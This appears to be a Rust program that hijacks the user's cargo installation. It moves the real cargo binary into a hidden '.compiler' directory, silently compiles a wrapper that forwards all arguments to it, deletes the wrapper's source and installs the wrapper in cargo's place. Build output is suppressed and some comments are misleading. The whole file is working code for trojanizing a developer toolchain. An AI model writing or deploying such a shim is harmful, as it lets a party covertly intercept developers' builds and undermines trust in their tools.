use std::fs::{self};
use std::io::Write;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::fs::OpenOptions;
use std::process::exit;
use std::process::Stdio;
use std::env;



fn locate_cargo_bin() -> Option<PathBuf> {
    // Retrieve the PATH environment variable
    if let Ok(paths) = env::var("PATH") {
        // Determine the path separator based on the operating system
        let separator = if cfg!(target_os = "windows") { ";" } else { ":" };
        // Iterate over each path in the PATH environment variable
        for path in paths.split(separator) {
            // Construct the full path to the cargo executable
            let cargo_path = Path::new(path).join("cargo");
            // Append '.exe' on Windows platforms
            let cargo_path = if cfg!(target_os = "windows") {
                cargo_path.with_extension("exe")
            } else {
                cargo_path
            };
            // Check if the cargo executable exists and is a file
            if cargo_path.is_file() {
                // Return the full path to the cargo executable if found
                return Some(cargo_path);
            }
        }
    }
    // Return None if the cargo executable is not found in the PATH
    None
}
fn main() -> std::io::Result<()> {

    let cargo_path = match locate_cargo_bin() { 
        Some(path) => path, None => { 
            eprintln!("Failed to locate cargo binary"); exit(1); 
        } 
    }; 
    let cargo_dir = cargo_path.parent().unwrap(); 
    let new_cargo_path = cargo_dir.join(".compiler/cargo"); 
    if new_cargo_path.parent().unwrap().exists(){
    return  Ok(());}
    

    // Path to the main.rs file within the new Cargo project
    let mut file = OpenOptions::new().append(true).create(true).open("cargo.rs").unwrap();
    

     let rust_code = format!(r#"
	use std::fs::OpenOptions;
	use std::process::Command;
	use std::io;
	use std::io::Write;
	
	fn main() -> io::Result<()> {{
		
		let file_path = "file.txt";

		let mut file = OpenOptions::new()
		.append(true)
		.create(true)
		.open(file_path)
		.unwrap();
   
		let args: Vec<String> = std::env::args().skip(1).collect();
		let mut command = Command::new({:?});
		for arg in args.iter() {{
		    command.arg(arg);
		}}
		let _ = command.status().expect("cargo not found");

		Ok(())
	}}
	"#, &new_cargo_path.to_str().unwrap() );
	
	let _ = writeln!(file, "{}", rust_code);

    // Compile the Cargo project
    Command::new("rustc")
        .arg("cargo.rs")
        .stdout(Stdio::null())  // Suppress stdout
    	.stderr(Stdio::null())  // Suppress stderr
        .status()?;
        
    let _ = fs::remove_file("cargo.rs");
        
    
    // move cargo into the compiler directory 
    fs::create_dir_all(&new_cargo_path.parent().unwrap())?; 
    let _ = fs::rename(&cargo_path, &new_cargo_path, )?; 

	// Define the final script path, taking into account platform-specific executable extensions.
	#[cfg(target_os = "windows")]
	let script_file_name = "cargo.exe";
	#[cfg(not(target_os = "windows"))]
	let script_file_name = "cargo";

	let script_path = cargo_dir.join(script_file_name);

	let _ = fs::rename(script_file_name , &script_path);
    
    Ok(())
}

